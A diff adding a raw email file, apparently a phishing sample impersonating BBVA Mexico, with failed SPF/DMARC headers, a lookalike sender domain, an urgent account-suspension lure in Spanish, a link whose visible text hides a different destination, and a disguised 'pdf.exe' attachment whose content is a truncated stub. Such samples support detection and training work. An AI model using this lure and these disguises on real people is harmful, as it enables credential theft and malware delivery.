@@ -1,0 +1,42 @@
+Return-Path: <bounce@mailer-notify.top>
+Authentication-Results: mx.example.net;
+       spf=fail (sender IP is 203.0.113.45) smtp.mailfrom=mailer-notify.top;
+       dkim=none;
+       dmarc=fail (p=REJECT) header.from=bbva-mx-seguridad.com
+From: "BBVA Mexico Seguridad" <alertas@bbva-mx-seguridad.com>
+Reply-To: soporte.clientes@gmail.com
+To: cliente@example.com
+Subject: Urgente: su cuenta ha sido suspendida
+Date: Mon, 28 Sep 2026 09:14:02 -0600
+Message-ID: <a1b2c3@bbva-mx-seguridad.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="MIXED"
+
+--MIXED
+Content-Type: multipart/alternative; boundary="ALT"
+
+--ALT
+Content-Type: text/plain; charset="utf-8"
+
+Estimado cliente: detectamos actividad inusual. Su cuenta ha sido suspendida.
+Verifique su cuenta en las proximas 24 horas: http://bbva-mx-seguridad.com/acceso/verificar
+
+--ALT
+Content-Type: text/html; charset="utf-8"
+
+<html><body>
+<p>Estimado cliente:</p>
+<p>Detectamos <b>actividad inusual</b>. Su cuenta ha sido suspendida.</p>
+<p>Verifique su cuenta en las próximas 24 horas:
+<a href="http://bbva-mx-seguridad.com/acceso/verificar?id=88213">https://www.bbva.mx/acceso</a></p>
+</body></html>
+
+--ALT--
+
+--MIXED
+Content-Type: application/octet-stream
+Content-Disposition: attachment; filename="estado_de_cuenta.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+--MIXED--
